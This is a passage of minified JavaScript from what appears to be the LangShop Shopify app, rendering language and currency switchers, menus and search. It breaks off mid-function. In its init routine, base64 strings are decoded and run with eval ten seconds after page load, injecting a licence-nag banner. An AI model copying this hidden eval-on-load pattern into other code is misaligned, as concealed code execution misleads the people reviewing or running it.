!function() {
    "use strict";
    function LangShop() {
        this.location = window.location.href,
            this.infoURL = null,
            this.assets = {
                languages: "",
                countries: ""
            },
            this.init = function(params) {
                if (!navigator.cookieEnabled)
                    return !1;
                for (var param in params)
                    if (param in this == !1 && params.hasOwnProperty(param) && "object" == typeof params[param] && (this[param] = {}),
                    params.hasOwnProperty(param) && "object" == typeof params[param])
                        for (var key in params[param])
                            params[param].hasOwnProperty(key) && (this[param][key] = params[param][key]);
                    else
                        this[param] = params[param];
                if (this.localization.languages = this.localization.languages.slice(0),
                    this.localization.languages.sort(function(a, b) {
                        return a.lang_order - b.lang_order
                    }),
                    window.Promise) {
                    var detectingUserLanguage = this.localization.detectUserLanguage();
                    detectingUserLanguage.then(function(a) {
                        LS.localization.defaultLang = a,
                            LS.localization.init()
                    })
                } else
                    LS.localization.init();
                this.priceonhover.init(),
                    this.domobserver.init(),
                    this.search.init(),
                    window.addEventListener("load", function() {
                        setTimeout(function() {
                            !0 !== eval(atob("d2luZG93LkxTX0dMT0JBTF9DT05TVF9DSEVDSw==")) && "_sc"in LS.localization.urlParams == !1 && eval(atob("dmFyIGRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2Rpdi5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7ZGl2LnN0eWxlLnRvcCA9ICIwIjtkaXYuc3R5bGUubGVmdCA9ICIwIjtkaXYuc3R5bGUud2lkdGggPSAiMTAwJSI7ZGl2LnN0eWxlLmxpbmVIZWlnaHQgID0gIjI1cHgiO2Rpdi5zdHlsZS50ZXh0QWxpZ24gPSAiY2VudGVyIjtkaXYuc3R5bGUuZm9udFNpemUgPSAiMTVweCI7ZGl2LnN0eWxlLmJhY2tncm91bmQgPSAicmdiYSgyNTUsIDAsIDAsIDAuOSkiO2Rpdi5zdHlsZS5jb2xvciA9ICJ3aGl0ZSI7ZGl2LnN0eWxlLmJvcmRlckJvdHRvbSA9ICIxcHggc29saWQgIzY2NiI7ZGl2LmlubmVySFRNTCA9ICJDdXJyZW50IHRoZW1lIHdhcyBtYWRlIGJ5IExhbmdTaG9wLiBUbyBjb250aW51ZSB1c2UgdGhpcyB0aGVtZSwgcGxlYXNlLCA8YSBzdHlsZT0nY29sb3I6ICMwNTNkZTg7IHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOycgaHJlZj0naHR0cHM6Ly9hcHBzLnNob3BpZnkuY29tL2xhbmdzaG9wJyB0YXJnZXQ9J19ibGFuayc+aW5zdGFsbDwvYT4gdGhlIGFwcGxpY2F0aW9uLiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkaXYpOw=="))
                        }, 1e4)
                    })
            }
            ,
            this.product = new LangShopProducts,
            this.getLanguageIcon = function(a, b) {
                var c = a.split("-")[0];
                return b ? this.assets.languages && b.indexOf("/assets/frontend/img/") > -1 ? this.assets.languages + "#flags-" + c : b.replace("32x32_crop_center", "43x32_crop_center") : this.assets.languages ? this.assets.languages + "#flags-" + c : "/apps/langshop/assets/frontend/img/flags/" + c + ".png"
            }
            ,
            this.getCurrencyIcon = function(a, b) {
                var c = a.substring(0, 2);
                return b ? this.assets.countries && b.indexOf("/assets/frontend/img/") > -1 ? this.assets.countries + "#countries-" + c : b.replace("32x32_crop_center", "43x32_crop_center") : this.assets.countries ? this.assets.countries + "#countries-" + c : "/apps/langshop/assets/frontend/img/countries/" + c + ".png"
            }
            ,
            this.render = {
                navigation: function(a, b, c) {
                    function d(a, b) {
                        var c = j[h].title.options.options_class.replace(/'/g, '"')
                            , f = j[h].title.options.options_id.replace(/'/g, '"')
                            , g = j[h].title.options.options_styles.replace(/'/g, '"')
                            , i = "options_child_class"in j[h].title.options ? j[h].title.options.options_child_class.replace(/'/g, '"') : ""
                            , l = "options_child_html_before"in j[h].title.options ? j[h].title.options.options_child_html_before : ""
                            , m = "options_child_html_after"in j[h].title.options ? j[h].title.options.options_child_html_after : ""
                            , n = b ? "<ul class='" + c + "' id='" + f + "' style='" + g + "'>" : l + "<ul class='" + i + "'>";
                        return a.forEach(function(b, c) {
                            var f = e(a[c], "menuItemUrl")
                                , g = window.location.pathname === f ? a[c].menuItemClass + " active" : a[c].menuItemClass
                                , h = "menuAClass"in a[c] ? a[c].menuAClass : ""
                                , i = "menuItemVisibility"in a[c] ? a[c].menuItemVisibility : "any";
                            if ("any" === i || k && "logined" === i || !k && "notlogined" === i) {
                                n += "<li class='" + g + "' title='" + e(a[c], "titleAttr") + "'>";
                                var j = "menuBeforeHtml"in a[c] ? a[c].menuBeforeHtml : ""
                                    , l = "menuAfterHtml"in a[c] ? a[c].menuAfterHtml : ""
                                    , m = "linkBeforeHtml"in a[c] ? a[c].linkBeforeHtml : ""
                                    , o = "linkAfterHtml"in a[c] ? a[c].linkAfterHtml : "";
                                "object" == typeof a[c].children ? (n += m + "<a class='" + h + "' href='" + f + "'>" + j + e(a[c], "title") + l + "</a>" + o,
                                    n += d(a[c].children)) : n += m + "<a class='" + h + "' href='" + f + "'>" + j + e(a[c], "title") + l + "</a>" + o,
                                    n += "</li>"
                            }
                        }),
                            n += "</ul>" + m
                    }
                    function e(a, b) {
                        var c = i + b;
                        return c in a ? a[c] ? a[c] : a[b] : b in a ? a[b] : ""
                    }
                    if (!a)
                        return !1;
                    var f = LS.localization
                        , g = ""
                        , h = b
                        , i = f.currentLang !== f.defaultLang ? f.currentLang + "_" : ""
                        , j = f.navigations
                        , k = c;
                    j && j.hasOwnProperty(h) ? (parseInt(j[h].title.options.options_disableTitle, 10) || (g += "<h3 class='ls-nav-title'>" + e(j[h].title.title, "title") + "</h3>"),
                        g += d(j[h].list, !0)) : g += "Menu not found",
                        a.innerHTML = g
                },
                currency: function(a) {
                    if (!a)
                        return !1;
                    var b = LS.localization
                        , c = a.id
                        , d = b.currency
                        , e = b.shop_currency
                        , f = b.currSwitcherType
                        , g = b.currSwitcherStyle
                        , h = b.currencies;
                    if (a && f && "disabled" !== f && null !== h && "object" == typeof h && "object" == typeof LS) {
                        if (h.map(function(a) {
                            return a.currId
                        }).indexOf(e) < 0)
                            return a.innerHTML = "Your main currency (" + e.toUpperCase() + ") not found in currencies list.",
                                !1;
                        a.addEventListener("click", function(a) {
                            var b = a.currentTarget;
                            b.querySelector("div") && b.querySelector("div").classList.toggle("opened")
                        });
                        var i = {}
                            , j = b.getSearchParameters();
                        j.cache = "false";
                        for (var k in h)
                            if (h.hasOwnProperty(k))
                                if (j[b.currUrlPrefix] = h[k].currId,
                                "get" === b.urlModifyType)
                                    j[b.getUrlPrefix] = b.currentLang,
                                        i[h[k].currId] = window.location.protocol + "//" + window.location.hostname + window.location.pathname + "?" + b.encodeQueryData(j);
                                else if ("hash" === b.urlModifyType)
                                    i[h[k].currId] = window.location.protocol + "//" + window.location.hostname + window.location.pathname + "?" + b.encodeQueryData(j) + "#" + b.currentLang;
                                else if ("domains" === b.urlModifyType && b.mdomains) {
                                    var l = JSON.parse(b.mdomains);
                                    if (l && b.currentLang in l) {
                                        var m = l[b.currentLang].split(",");
                                        i[h[k].currId] = window.location.protocol + "//" + m[0] + window.location.pathname + "?" + b.encodeQueryData(j)
                                    }
                                }
                        b.switchersStyleSets && b.styleGenerator(c, g, f, b.switchersStyleSets.currency);
                        var n, o, p, q, r, s, t = h.map(function(a) {
                            return a.currId
                        }).indexOf(d);
                        switch (t < 0 && (t = 0),
                            f) {
                            case "li-horizontal-non-flags":
                                o = "<ul class='ls-" + f + "'>";
                                for (n in h)
                                    h.hasOwnProperty(n) && (p = h[n].currId in i ? "<a href='" + i[h[n].currId] + "'>" : "",
                                        q = h[n].currId in i ? "</a>" : "",
                                        s = h[n].currId === d ? "class='ls-curr-switcher-active'" : "",
                                        o += "<li data-currid='" + h[n].currId + "' " + s + ">" + p + b.escape(h[n].title) + q + "</li>");
                                o += "</ul>",
                                    a.innerHTML = o;
                                break;
                            case "li-horizontal-non-text":
                                o = "<ul class='ls-" + f + "'>";
                                for (n in h)
                                    h.hasOwnProperty(n) && (p = h[n].currId in i ? "<a href='" + i[h[n].currId] + "'>" : "",
                                        q = h[n].currId in i ? "</a>" : "",
                                        r = h[n].currIcon,
                                        s = h[n].currId === d ? "class='ls-curr-switcher-active'" : "",
                                        o += "<li data-currid='" + h[n].currId + "' " + s + ">" + p + "<span class='flag-wrap'><img src=" + LS.getCurrencyIcon(h[n].currId, r) + " /></span>" + q + "</li>");
                                o += "</ul>",
                                    a.innerHTML = o;
                                break;
                            case "li-horizontal":
                                o = "<ul class='ls-" + f + "'>";
                                for (n in h)
                                    h.hasOwnProperty(n) && (p = h[n].currId in i ? "<a href='" + i[h[n].currId] + "'>" : "",
                                        q = h[n].currId in i ? "</a>" : "",
                                        s = h[n].currId === d ? "class='ls-curr-switcher-active'" : "",
                                        r = h[n].currIcon,
                                        o += "<li data-currid='" + h[n].currId + "' " + s + ">" + p + "<span class='flag-wrap'><img src=" + LS.getCurrencyIcon(h[n].currId, r) + " /></span>" + b.escape(h[n].title) + q + "</li>");
                                o += "</ul>",
                                    a.innerHTML = o;
                                break;
                            case "li-vertical-non-flags":
                                o = "<div class='ls-" + f + "'>",
                                    o += "<span data-currid='" + h[t].currId + "' class='ls-curr-switcher-active'>" + b.escape(h[t].title) + "</span>",
                                    o += "<ul>";
                                for (n in h)
                                    h.hasOwnProperty(n) && (p = h[n].currId in i ? "<a href='" + i[h[n].currId] + "'>" : "",
                                        q = h[n].currId in i ? "</a>" : "",
                                        o += parseInt(n) !== t ? "<li data-currId='" + h[n].currId + "'>" + p + b.escape(h[n].title) + q + "</li>" : "");
                                o += "</ul></div>",
                                    a.innerHTML = o;
                                break;
                            case "li-vertical-non-text":
                                r = h[t].currIcon,
                                    o = "<div class='ls-" + f + "'>",
                                    o += "<span data-currid='" + h[t].currId + "' class='ls-curr-switcher-active'><span class='flag-wrap'><img src=" + LS.getCurrencyIcon(h[t].currId, r) + " /></span></span>",
                                    o += "<ul>";
                                for (n in h)
                                    h.hasOwnProperty(n) && (p = h[n].currId in i ? "<a href='" + i[h[n].currId] + "'>" : "",
                                        q = h[n].currId in i ? "</a>" : "",
                                    parseInt(n) !== t && (r = h[n].currIcon,
                                        o += "<li data-currid='" + h[n].currId + "'>" + p + "<span class='flag-wrap'><img src=" + LS.getCurrencyIcon(h[n].currId, r) + " /></span>" + q + "</li>"));
                                o += "</ul></div>",
                                    a.innerHTML = o;
                                break;
                            case "li-vertical":
                                r = h[t].currIcon,
                                    o = "<div class='ls-" + f + "'>",
                                    o += "<span data-currid='" + h[t].currId + "' class='ls-curr-switcher-active'><span class='flag-wrap'><img src=" + LS.getCurrencyIcon(h[t].currId, r) + " /></span>" + b.escape(h[t].title) + "</span>",
                                    o += "<ul>";
                                for (n in h)
                                    h.hasOwnProperty(n) && (p = h[n].currId in i ? "<a href='" + i[h[n].currId] + "'>" : "",
                                        q = h[n].currId in i ? "</a>" : "",
                                    parseInt(n) !== t && (r = h[n].currIcon,
                                        o += "<li data-currid='" + h[n].currId + "'>" + p + "<span class='flag-wrap'><img src=" + LS.getCurrencyIcon(h[n].currId, r) + " /></span>" + b.escape(h[n].title) + q + "</li>"));
                                o += "</ul></div>",
                                    a.innerHTML = o;
                                break;
                            case "select":
                                var u = document.createElement("SELECT");
                                for (n in h)
                                    if (h.hasOwnProperty(n)) {
                                        var v = document.createElement("OPTION");
                                        v.text = h[n].title,
                                            v.value = h[n].currId,
                                        h[n].currId === d && (v.selected = !0),
                                            u.add(v, null)
                                    }
                                a.appendChild(u)
                        }
                        var w = function(a) {
                            if ("ls-style-theme-b" !== g)
                                return !0;
                            var b, c = 0, d = "up", e = h.length;
                            [].forEach.call(a.querySelectorAll("li"), function(a) {
                                a.classList.contains("ls-curr-switcher-active") ? (c = e,
                                    d = "down") : ("up" === d ? (c++,
                                    b = "z-index:" + c + "; direction: ltr;") : (c--,
                                    b = "z-index:" + c + "; direction: rtl;"),
                                    a.setAttribute("style", b))
                            })
                        };
                        if (w(a),
                        "select" === f) {
                            var x = a.querySelector("select");
                            x.addEventListener("change", function(a) {
                                var c = a.target.value;
                                if (c === d)
                                    return !1;
                                b.cartLangUpdate(null, !1, c);
                                var e = document.querySelectorAll(".LS_converted_currencies");
                                e.length && [].forEach.call(e, function(a) {
                                    if ("1" === LS.localization.defaultCurrOnHover && (c !== b.defaultCurr ? a.classList.contains("LS_show_on_hover") || a.classList.add("LS_show_on_hover") : a.classList.remove("LS_show_on_hover")),
                                    c in a.dataset) {
                                        var e = a.previousSibling
                                            , f = d in a.dataset && e.data.indexOf(a.dataset[d]) >= 0 ? e.data.replace(a.dataset[d].trim(), a.dataset[c].trim()) : a.dataset[c].trim();
                                        if ("#text" === e.nodeName)
                                            if ("SUP" === e.parentNode.nodeName && "#text" === e.parentNode.previousSibling.nodeName) {
                                                var g = f.split("<sup>");
                                                e.parentNode.previousSibling.data = g[0],
                                                g[1] && (e.data = g[1])
                                            } else
                                                e.data = f
                                    }
                                }),
                                    d = c,
                                    b.setCookie("ls_curr", c, 30),
                                    b.currency = c,
                                    document.dispatchEvent(new CustomEvent("langshop/currency/change",{
                                        detail: c
                                    })),
                                "1" === b.urlModify && (b.currUrlPrefix in b.urlParams ? (LS.location = LS.location.replace(b.currUrlPrefix + "=" + b.urlParams[b.currUrlPrefix], b.currUrlPrefix + "=" + c),
                                    window.history.replaceState(null, null, LS.location)) : (LS.location = window.location.protocol + "//" + window.location.hostname + window.location.pathname + window.location.search,
                                    LS.location += (LS.location.indexOf("?") >= 0 ? "&" : "?") + b.currUrlPrefix + "=" + c,
                                    window.history.replaceState(null, null, LS.location))),
                                    b.urlParams[b.currUrlPrefix] = c
                            }),
                            d !== b.currency && (x.value = b.currency,
                                x.dispatchEvent(new CustomEvent("change")))
                        } else
                            [].forEach.call(a.querySelectorAll("li"), function(c) {
                                c.querySelector("a") && (c.querySelector("a").onclick = function(a) {
                                        a.preventDefault()
                                    }
                                ),
                                    c.addEventListener("click", function(c) {
                                        var e = b.getClickAncestor(c.target, "li")
                                            , g = e.dataset
                                            , h = e.dataset.currid;
                                        if (g.currid === d)
                                            return !1;
                                        b.cartLangUpdate(null, !1, h);
                                        var i = document.querySelectorAll(".LS_converted_currencies");
                                        if (i.length && [].forEach.call(i, function(a) {
                                            if ("1" === LS.localization.defaultCurrOnHover && (g.currid !== b.defaultCurr ? a.classList.contains("LS_show_on_hover") || a.classList.add("LS_show_on_hover") : a.classList.remove("LS_show_on_hover")),
                                            g.currid in a.dataset) {
                                                var c = a.previousSibling
                                                    , e = d in a.dataset && c.data.indexOf(a.dataset[d]) >= 0 ? c.data.replace(a.dataset[d].trim(), a.dataset[g.currid].trim()) : a.dataset[g.currid].trim();
                                                if ("#text" === c.nodeName)
                                                    if ("SUP" === c.parentNode.nodeName && "#text" === c.parentNode.previousSibling.nodeName) {
                                                        var f = e.split("<sup>");
                                                        c.parentNode.previousSibling.data = f[0],
                                                        f[1] && (c.data = f[1])
                                                    } else
                                                        c.data = e
                                            }
                                        }),
                                        "li-horizontal-non-flags" === f || "li-horizontal-non-text" === f || "li-horizontal" === f)
                                            [].forEach.call(a.querySelectorAll("li"), function(a) {
                                                a.classList.remove("ls-curr-switcher-active")
                                            }),
                                                e.classList.add("ls-curr-switcher-active"),
                                                w(a);
                                        else {
                                            var j = a.querySelector(".ls-curr-switcher-active")
                                                , k = j.innerHTML;
                                            j.setAttribute("data-currid", h),
                                                j.dataset.currid = h;
                                            var l = e
                                                , m = l.innerHTML;
                                            l.setAttribute("data-currid", d),
                                                l.dataset.currid = d,
                                                l.innerHTML = k,
                                                j.innerHTML = m,
                                            l.querySelector("a") && (l.querySelector("a").onclick = function(a) {
                                                    a.preventDefault()
                                                }
                                            ),
                                            j.querySelector("a") && (j.querySelector("a").onclick = function(a) {
                                                    a.preventDefault()
                                                }
                                            )
                                        }
                                        d = h,
                                            b.setCookie("ls_curr", h, 30),
                                            b.currency = h,
                                            document.dispatchEvent(new CustomEvent("langshop/currency/change",{
                                                detail: h
                                            })),
                                        "1" === b.urlModify && (b.currUrlPrefix in b.urlParams ? (LS.location = LS.location.replace(b.currUrlPrefix + "=" + b.urlParams[b.currUrlPrefix], b.currUrlPrefix + "=" + h),
                                            window.history.replaceState(null, null, LS.location)) : (LS.location = window.location.protocol + "//" + window.location.hostname + window.location.pathname + window.location.search,
                                            LS.location += (LS.location.indexOf("?") >= 0 ? "&" : "?") + b.currUrlPrefix + "=" + h,
                                            window.history.replaceState(null, null, LS.location))),
                                            b.urlParams[b.currUrlPrefix] = h
                                    }),
                                d !== b.currency && c.dataset.currid === b.currency && c.dispatchEvent(new CustomEvent("click"))
                            })
                    }
                },
                language: function(a) {
                    function b(a) {
                        if ("ls-style-theme-b" !== c.switcherStyle)
                            return !0;
                        var b, d = 0, e = "up", f = c.languages.length;
                        [].forEach.call(a.querySelectorAll("li"), function(a) {
                            a.classList.contains("ls-lang-switcher-active") ? (d = f,
                                e = "down") : ("up" === e ? (d++,
                                b = "z-index:" + d + "; direction: ltr;") : (d--,
                                b = "z-index:" + d + "; direction: rtl;"),
                                a.setAttribute("style", b))
                        })
                    }
                    if (!a)
                        return !1;
                    var c = LS.localization
                        , d = a.id
                        , e = {}
                        , f = c.getSearchParameters();
                    f.cache = "false",
                        f[c.currUrlPrefix] = c.currency,
                        a.addEventListener("click", function(a) {
                            var b = a.currentTarget;
                            b.querySelector("div") && b.querySelector("div").classList.toggle("opened")
                        });
                    for (var g = 0; g < c.languages.length; g++)
                        if ("get" === c.urlModifyType)
                            f[c.getUrlPrefix] = c.languages[g].lang_id,
                                e[c.languages[g].lang_id] = window.location.protocol + "//" + window.location.hostname + window.location.pathname + "?" + c.encodeQueryData(f);
                        else if ("hash" === c.urlModifyType)
                            e[c.languages[g].lang_id] = window.location.protocol + "//" + window.location.hostname + window.location.pathname + "?" + c.encodeQueryData(f) + "#" + c.languages[g].lang_id;
                        else if ("domains" === c.urlModifyType && c.mdomains) {
                            var h = JSON.parse(c.mdomains);
                            if (h && c.languages[g].lang_id in h) {
                                var i = h[c.languages[g].lang_id].split(",");
                                e[c.languages[g].lang_id] = window.location.protocol + "//" + i[0] + window.location.pathname + "?" + c.encodeQueryData(f)
                            }
                        }
                    var j = c.switcherType ? c.switcherType : "li-horizontal";
                    c.switchersStyleSets && c.styleGenerator(d, c.switcherStyle, c.switcherType, c.switchersStyleSets.language);
                    var k, l, m, n, o, p, q = c.languages.map(function(a) {
                        return a.lang_id
                    }).indexOf(c.currentLang);
                    switch (q < 0 && (q = 0),
                        j) {
                        case "li-horizontal-non-flags":
                            for (l = "<ul class='ls-" + j + "'>",
                                     k = 0; k < c.languages.length; k++)
                                m = c.languages[k].lang_id in e ? "<a href='" + e[c.languages[k].lang_id] + "'>" : "",
                                    n = c.languages[k].lang_id in e ? "</a>" : "",
                                    p = c.languages[k].lang_id === c.currentLang ? "class='ls-lang-switcher-active'" : "",
                                    l += "<li data-lang-id='" + c.languages[k].lang_id + "' " + p + ">" + m + c.escape(c.languages[k].lang_title) + n + "</li>";
                            l += "</ul>",
                                a.innerHTML = l;
                            break;
                        case "li-horizontal-non-text":
                            for (l = "<ul class='ls-" + j + "'>",
                                     k = 0; k < c.languages.length; k++)
                                m = c.languages[k].lang_id in e ? "<a href='" + e[c.languages[k].lang_id] + "'>" : "",
                                    n = c.languages[k].lang_id in e ? "</a>" : "",
                                    o = c.languages[k].lang_flag,
                                    p = c.languages[k].lang_id === c.currentLang ? "class='ls-lang-switcher-active'" : "",
                                    l += "<li data-lang-id='" + c.languages[k].lang_id + "' " + p + ">" + m + "<span class='flag-wrap'><img src=" + LS.getLanguageIcon(c.languages[k].lang_id, o) + " /></span>" + n + "</li>";
                            l += "</ul>",
                                a.innerHTML = l;
                            break;
                        case "li-horizontal":
                            for (l = "<ul class='ls-" + j + "'>",
                                     k = 0; k < c.languages.length; k++)
                                m = c.languages[k].lang_id in e ? "<a href='" + e[c.languages[k].lang_id] + "'>" : "",
                                    n = c.languages[k].lang_id in e ? "</a>" : "",
                                    p = c.languages[k].lang_id === c.currentLang ? "class='ls-lang-switcher-active'" : "",
                                    o = c.languages[k].lang_flag,
                                    l += "<li data-lang-id='" + c.languages[k].lang_id + "' " + p + ">" + m + "<span class='flag-wrap'><img src=" + LS.getLanguageIcon(c.languages[k].lang_id, o) + " /></span>" + c.escape(c.languages[k].lang_title) + n + "</li>";
                            l += "</ul>",
                                a.innerHTML = l;
                            break;
                        case "li-vertical-non-flags":
                            for (l = "<div class='ls-" + j + "'>",
                                     l += "<span data-lang-id='" + c.languages[q].lang_id + "' class='ls-lang-switcher-active'>" + c.escape(c.languages[q].lang_title) + "</span>",
                                     l += "<ul>",
                                     k = 0; k < c.languages.length; k++)
                                m = c.languages[k].lang_id in e ? "<a href='" + e[c.languages[k].lang_id] + "'>" : "",
                                    n = c.languages[k].lang_id in e ? "</a>" : "",
                                    l += k !== q ? "<li data-lang-id='" + c.languages[k].lang_id + "'>" + m + c.escape(c.languages[k].lang_title) + n + "</li>" : "";
                            l += "</ul></div>",
                                a.innerHTML = l;
                            break;
                        case "li-vertical-non-text":
                            for (o = c.languages[q].lang_flag,
                                     l = "<div class='ls-" + j + "'>",
                                     l += "<span data-lang-id='" + c.languages[q].lang_id + "' class='ls-lang-switcher-active'><span class='flag-wrap'><img src=" + LS.getLanguageIcon(c.languages[q].lang_id, o) + " /></span></span>",
                                     l += "<ul>",
                                     k = 0; k < c.languages.length; k++)
                                m = c.languages[k].lang_id in e ? "<a href='" + e[c.languages[k].lang_id] + "'>" : "",
                                    n = c.languages[k].lang_id in e ? "</a>" : "",
                                k !== q && (o = c.languages[k].lang_flag,
                                    l += "<li data-lang-id='" + c.languages[k].lang_id + "'>" + m + "<span class='flag-wrap'><img src=" + LS.getLanguageIcon(c.languages[k].lang_id, o) + " /></span>" + n + "</li>");
                            l += "</ul></div>",
                                a.innerHTML = l;
                            break;
                        case "li-vertical":
                            for (o = c.languages[q].lang_flag,
                                     l = "<div class='ls-" + j + "'>",
                                     l += "<span data-lang-id='" + c.languages[q].lang_id + "' class='ls-lang-switcher-active'><span class='flag-wrap'><img src=" + LS.getLanguageIcon(c.languages[q].lang_id, o) + " /></span>" + c.escape(c.languages[q].lang_title) + "</span>",
                                     l += "<ul>",
                                     k = 0; k < c.languages.length; k++)
                                m = c.languages[k].lang_id in e ? "<a href='" + e[c.languages[k].lang_id] + "'>" : "",
                                    n = c.languages[k].lang_id in e ? "</a>" : "",
                                k !== q && (o = c.languages[k].lang_flag,
                                    l += "<li data-lang-id='" + c.languages[k].lang_id + "'>" + m + "<span class='flag-wrap'><img src=" + LS.getLanguageIcon(c.languages[k].lang_id, o) + " /></span>" + c.escape(c.languages[k].lang_title) + n + "</li>");
                            l += "</ul></div>",
                                a.innerHTML = l;
                            break;
                        case "select":
                            var r = document.createElement("SELECT");
                            for (k = 0; k < c.languages.length; k++) {
                                var s = document.createElement("OPTION");
                                s.text = c.languages[k].lang_title,
                                    s.value = c.languages[k].lang_id,
                                c.languages[k].lang_id === c.currentLang && (s.selected = !0),
                                    r.add(s, null)
                            }
                            a.appendChild(r);
                            break;
                        default:
                            return !1
                    }
                    b(a),
                        "select" === j ? a.querySelector("select").addEventListener("change", function(a) {
                            var b = a.target.value;
                            if (b === c.currentLang)
                                return !1;
                            if (c.buildify) {
                                var d = b !== c.defaultLang ? b : "";
                                return c.setCookie("ls_lang", b, 30),
                                    c.cartLangUpdate(b, !1),
                                    document.dispatchEvent(new CustomEvent("buildify-preview/switch",{
                                        detail: d
                                    })),
                                    !1
                            }
                            if (LS.location = window.location.href,
                            "1" === c.urlModify)
                                if (c.getUrlPrefix in c.urlParams && "get" === c.urlModifyType)
                                    LS.location = LS.location.replace(c.getUrlPrefix + "=" + c.urlParams[c.getUrlPrefix], c.getUrlPrefix + "=" + b),
                                        window.history.replaceState(null, null, LS.location);
                                else if ("hash" === c.urlModifyType)
                                    location.hash = b;
                                else if ("domains" === c.urlModifyType && c.mdomains) {
                                    var e = JSON.parse(c.mdomains);
                                    if (e && b in e) {
                                        var f = e[b].split(",")
                                            , g = window.location;
                                        g = g.toString(),
                                            g = g.replace(window.location.host, f[0]),
                                            window.location = g
                                    }
                                }
                            c.setCookie("ls_lang", b, 30),
                                c.cartLangUpdate(b, !0)
                        }) : [].forEach.call(a.querySelectorAll("li"), function(a) {
                            a.querySelector("a") && (a.querySelector("a").onclick = function(a) {
                                    a.preventDefault()
                                }
                            ),
                                a.addEventListener("click", function(a) {
                                    var b = c.getClickAncestor(a.target, "li");
                                    if (null === b)
                                        return !1;
                                    var d = b.getAttribute("data-lang-id");
                                    if (d === c.currentLang)
                                        return !1;
                                    if (c.buildify) {
                                        var e = d !== c.defaultLang ? d : "";
                                        return c.setCookie("ls_lang", d, 30),
                                            c.cartLangUpdate(d, !1),
                                            document.dispatchEvent(new CustomEvent("buildify-preview/switch",{
                                                detail: e
                                            })),
                                            !1
                                    }
                                    if (LS.location = window.location.href,
                                    "1" === c.urlModify)
                                        if (c.getUrlPrefix in c.urlParams && "get" === c.urlModifyType)
                                            LS.location = LS.location.replace(c.getUrlPrefix + "=" + c.urlParams[c.getUrlPrefix], c.getUrlPrefix + "=" + d),
                                                window.history.replaceState(null, null, LS.location);
                                        else if ("hash" === c.urlModifyType)
                                            location.hash = d;
                                        else if ("domains" === c.urlModifyType && c.mdomains) {
                                            var f = JSON.parse(c.mdomains);
                                            if (f && d in f) {
                                                var g = f[d].split(",")
                                                    , h = window.location;
                                                h = h.toString(),
                                                    h = h.replace(window.location.host, g[0]),
                                                    window.location = h
                                            }
                                        }
                                    c.setCookie("ls_lang", d, 30),
                                        c.cartLangUpdate(d, !0)
                                })
                        })
                }
            },
            this.search = {
                queue: [],
                searching: {},
                total_products: null,
                translations: {
                    results_found: "",
                    results_not_found: "",
                    popup_products_heading: "",
                    popup_collections_heading: "",
                    popup_articles_heading: "",
                    search_disabled: "Seems LangShop custom searching was disabled. Enable it in your application settings."
                },
                settings: {
                    searchCollections: null,
                    searchProducts: null,
                    searchArticles: null,
                    actualBlogsHandles: null,
                    searchPageHandle: null
                },
                init: function() {
                    function a(a, c) {
                        if (void 0 !== a) {
                            f.popup.summary += a.length,
                                b();
                            var d = document.createElement("h3");
                            "products" !== c || f.popup.products.childElementCount ? "collections" !== c || f.popup.collections.childElementCount ? "articles" !== c || f.popup.articles.childElementCount || (d.innerHTML = f.translations.popup_articles_heading,
                                f.popup.articles.appendChild(d)) : (d.innerHTML = f.translations.popup_collections_heading,
                                f.popup.collections.appendChild(d)) : (d.innerHTML = f.translations.popup_products_heading,
                                f.popup.products.appendChild(d)),
                                a.forEach(function(a) {
                                    var b = document.createElement("div");
                                    if (b.classList.add("ls_grid_item"),
                                    "products" === c) {
                                        f.popup.products.style.display = "block",
                                        a.item.handle in LS.product == !1 && (LS.product[a.item.handle] = {
                                            original: a.item,
                                            locale: function() {
                                                return this.original
                                            }
                                        },
                                            LS.product[a.item.handle].original.title = a.title,
                                            LS.product[a.item.handle].original.description = a.description),
                                            b.classList.add("ls_grid_product");
                                        var d = "/products/" + a.item.handle
                                            , e = document.createElement("a");
                                        e.href = d;
                                        var g = document.createElement("img");
                                        g.src = a.item.featured_image ? a.item.featured_image : "https://cdn.shopify.com/s/assets/no-image-2048-5e88c1b20e087fb7bbe9a3771824e743c244f437e4f8ba93bbf7b11b53f7824c_480x480.gif";
                                        var h = document.createElement("div");
                                        h.classList.add("ls_product_image_wrapper"),
                                            h.appendChild(e),
                                            e.appendChild(g);
                                        var i = document.createElement("p");
                                        i.classList.add("ls_title");
                                        var j = document.createElement("a");
                                        j.href = d,
                                            j.innerHTML = a.title,
                                            i.appendChild(j);
                                        var k = document.createElement("p");
                                        k.classList.add("ls_product_price"),
                                            k.innerHTML = LS.localization.formatMoney(a.item.price),
                                            i.appendChild(k),
                                            b.appendChild(h),
                                            b.appendChild(i),
                                            f.popup.products.appendChild(b)
                                    } else {
                                        b.classList.add("ls_grid_text");
                                        var l = document.createElement("a");
                                        l.classList.add("ls_title"),
                                            l.innerHTML = a.title,
                                            "collections" === c ? l.href = "/collections/" + a.item.handle : "articles" === c && (l.href = "/blogs/" + a.blog + "/" + a.item.handle);
                                        var m;
                                        m = "excerpt"in a && a.excerpt ? a.excerpt : a.description.length > 220 ? a.description.substring(0, 220) + "..." : a.description;
                                        var n = document.createElement("p");
                                        n.innerHTML = m,
                                            b.appendChild(l),
                                            b.appendChild(n),
                                            "collections" === c ? (f.popup.collections.appendChild(b),
                                                f.popup.collections.style.display = "block") : "articles" === c && (f.popup.articles.appendChild(b),
                                                f.popup.articles.style.display = "block")
                                    }
                                })
                        }
                    }
                    function b() {
                        f.popup.results && (f.popup.results.innerHTML = f.popup.summary > 0 ? f.translations.results_found.replace(/\[\[count\]\]/g, f.popup.summary).replace(/\[\[terms\]\]/g, f.popup.term) : f.translations.results_not_found.replace(/\[\[terms\]\]/g, f.popup.term),
                        f.popup.summary > 0 && (f.popup.results.style.display = "block"))
                    }
                    function c() {
                        b(),
                            f.popup.results.style.display = "block",
                            f.popup.window.classList.remove("ls_searching_progress")
                    }
                    function d() {
                        f.popup.results && (f.popup.results.innerHTML = f.translations.search_disabled,
                            f.popup.results.style.display = "block"),
                            f.popup.window.classList.remove("ls_searching_progress")
                    }
                    var e, f = LS.search;
                    if ("1" !== f.settings.searchCollections && "1" !== f.settings.searchProducts && "1" !== f.settings.searchArticles)
                        return !1;
                    document.addEventListener("DOMContentLoaded", function() {
                        f.popup.init();
                        var b = document.querySelectorAll("a[href^='/search']");
                        b.length && [].forEach.call(b, function(a) {
                            a.href = "/pages/" + f.settings.searchPageHandle
                        });
